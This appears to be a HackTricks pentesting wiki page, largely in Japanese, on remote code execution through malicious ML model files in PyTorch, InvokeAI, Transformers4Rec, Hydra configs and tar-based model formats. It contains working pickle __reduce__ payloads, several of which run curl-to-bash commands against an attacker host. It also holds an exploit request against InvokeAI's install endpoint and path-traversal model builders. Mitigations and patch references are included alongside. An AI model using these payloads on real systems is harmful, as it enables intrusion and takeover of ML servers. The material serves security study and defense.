# モデルのRCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models は通常 ONNX、TensorFlow、PyTorch などのフォーマットで共有されます。これらのモデルは開発者のマシンや本番システムにロードして使用されます。通常、モデルに悪意のあるコードが含まれるべきではありませんが、モデルが system 上で arbitrary code を実行するために使われ得るケースがあり、それは意図された機能によるものか、モデル読み込みライブラリの脆弱性によるものです。

執筆時点で、この種の脆弱性の例は以下の通りです：

| **フレームワーク / ツール**        | **脆弱性（CVE がある場合）**                                                    | **RCE ベクター**                                                                                                                           | **参照**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | モデルチェックポイント内の悪意ある pickle が code execution を引き起こす（`weights_only` 保護をバイパス）                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF と悪意あるモデルダウンロードで code execution が発生; management API における Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | 信頼できないチェックポイントが `load_model_trainer_states_from_checkpoint` 中に pickle reducer を起動 → ML worker で code execution            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML からモデルをロードする際に `yaml.unsafe_load` を使用（code exec） <br> **Lambda** レイヤーを含むモデルのロードは arbitrary Python code を実行          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 細工された `.tflite` モデルが integer overflow を引き起こし → heap corruption（potential RCE）                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` でモデルをロードすると attacker の `__reduce__` ペイロードを含む pickle が実行される                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` のデフォルトは pickled object arrays を許可しており、悪意ある `.npy/.npz` が code exec を引き起こす                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX モデルの external-weights パスがディレクトリから脱出できる（read arbitrary files） <br> 悪意ある ONNX モデル tar が任意ファイルを上書きできる（leading to RCE） | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operator を含むモデルは攻撃者の native code のロードを必要とする; 複雑なモデルグラフがロジックを悪用して意図しない計算を実行する   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` を有効にして model-load API を使用すると relative path traversal でファイルを書き込める（例: `.bashrc` を overwrite して RCE）    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 破損した GGUF モデルファイルがパーサで heap buffer overflows を起こし、victim system 上で arbitrary code execution を可能にする                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda レイヤーを含む悪意ある HDF5 (`.h5`) モデルのコードはロード時に実行される（Keras safe_mode は古いフォーマットをカバーしない – “downgrade attack”） | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 多くのMLツール（例: pickle ベースのモデルフォーマット、Python の `pickle.load`）は、対策がなければモデルファイルに埋め込まれた arbitrary code を実行する | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | 攻撃者が制御するモデルの metadata/config が `_target_` を arbitrary callable（例: `builtins.exec`）に設定 → load 中に実行される。これは “safe” フォーマット（`.safetensors`, `.nemo`, repo `config.json`）でも起こり得る | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

さらに、[PyTorch](https://github.com/pytorch/pytorch/security) などで使われる python の pickle ベースのモデルは、`weights_only=True` でロードされない場合、system 上で arbitrary code を実行するために利用される可能性があります。そのため、上の表に記載がなくても、pickle ベースのモデルはこの種の攻撃に特に脆弱である可能性があります。

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` は configuration/metadata オブジェクト内の dotted `_target_` を import して呼び出します。ライブラリが **untrusted model metadata** を `instantiate()` に渡すと、攻撃者は callable と引数を提供して、model load 時に即座に実行させることができます（pickle は不要）。

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):
```yaml
_target_: builtins.exec
_args_:
- "import os; os.system('curl http://ATTACKER/x|bash')"
```
Key points:
- NeMo の `restore_from/from_pretrained`、uni2TS HuggingFace coders、FlexTok loaders でモデル初期化の前にトリガーされる。
- Hydra の文字列ブロックリストは、代替の import パス（例: `enum.bltns.eval`）やアプリケーション解決名（例: `nemo.core.classes.common.os.system` → `posix`）を使って回避可能。
- FlexTok はまた、文字列化されたメタデータを `ast.literal_eval` で解析するため、Hydra 呼び出し前に DoS（CPU/メモリの枯渇）を引き起こすことが可能。

### 🆕  InvokeAI の RCE（`torch.load` 経由） (CVE-2024-12029)

`InvokeAI` は Stable-Diffusion 向けの人気のあるオープンソースの Web インターフェースです。バージョン **5.3.1 – 5.4.2** は、任意の URL からモデルをダウンロードしてロードできる REST エンドポイント `/api/v2/models/install` を公開しています。

内部的には、このエンドポイントは最終的に次を呼び出します:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### 悪用手順

1. 悪意のあるチェックポイントを作成する:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. あなたが管理する HTTP サーバーで `payload.ckpt` をホストします（例: `http://ATTACKER/payload.ckpt`）。
3. 脆弱なエンドポイントをトリガーします（認証不要）:
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. When InvokeAI downloads the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### 条件

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` が攻撃者から到達可能であること  
•  プロセスが shell commands を実行する権限を持っていること

#### 緩和策

* Upgrade to **InvokeAI ≥ 5.4.3** – the patch sets `scan=True` by default and performs malware scanning before deserialization.  
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.  
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Remember that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to deserialize from untrusted sources.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA の Transformers4Rec（Merlin の一部）は、安全でないチェックポイントローダーを公開しており、ユーザ提供のパスに対して直接 `torch.load()` を呼び出していました。`torch.load` が Python の `pickle` に依存しているため、攻撃者が用意したチェックポイントはデシリアライズ中の reducer を介して任意のコードを実行できます。

脆弱なパス（修正前）: `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

なぜこれが RCE につながるのか: Python の pickle では、オブジェクトが reducer (`__reduce__`/`__setstate__`) を定義して、呼び出し可能なオブジェクトと引数を返すことができます。アンピックル（unpickling）中にその呼び出し可能オブジェクトが実行されます。もしそのようなオブジェクトがチェックポイントに含まれていれば、重みが使用される前に実行されます。

Minimal malicious checkpoint example:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized チェックポイント/モデルがリポジトリ、バケット、またはアーティファクトレジストリを介して共有される
- チェックポイントを自動ロードする自動化された resume/deploy パイプライン
- 実行は training/inference ワーカー内で発生し、多くの場合特権で（例：root in containers）実行される

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) は直接の `torch.load()` を `transformers4rec/utils/serialization.py` に実装された限定された許可リスト方式のデシリアライザに置き換えました。新しいローダーは型/フィールドを検証し、ロード時に任意の callables が呼び出されるのを防ぎます。

Defensive guidance specific to PyTorch checkpoints:
- 信頼できないデータを unpickle しないこと。可能であれば [Safetensors](https://huggingface.co/docs/safetensors/index) や ONNX を優先する。
- どうしても PyTorch シリアライズを使う必要がある場合は、`weights_only=True`（新しい PyTorch でサポート）を指定するか、Transformers4Rec のパッチに類似した許可リスト方式のカスタム unpickler を使うこと。
- モデルの出自/署名を強制し、サンドボックス内でのデシリアライズを行う（seccomp/AppArmor; non-root user; 制限された FS とネットワーク egress の禁止）。
- チェックポイントのロード時に ML サービスからの予期しない子プロセスを監視し、`torch.load()`/`pickle` の使用をトレースすること。

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- モデルを読み込む:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent の FaceDetection-DSFD は、ユーザー制御のデータをデシリアライズする `resnet` エンドポイントを公開している。ZDI によって、リモート攻撃者が被害者に悪意あるページ/ファイルを読み込ませ、そのページ/ファイルにより細工した serialized blob を当該エンドポイントに送信させ、`root` としてデシリアライズを引き起こし完全な侵害につながることが確認された。

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## モデルを利用した Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
あるいは、以下のコードを使うと、読み込まれたときに `/tmp` ディレクトリへのシンボリックリンクを作成するモデルを作成できます：
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 詳細解析: Keras .keras deserialization and gadget hunting

.keras internals、Lambda-layer RCE、≤ 3.8 の arbitrary import issue、および allowlist 内の post-fix gadget discovery に関する集中的なガイドは、次を参照してください：


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考文献

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)

{{#include ../banners/hacktricks-training.md}}
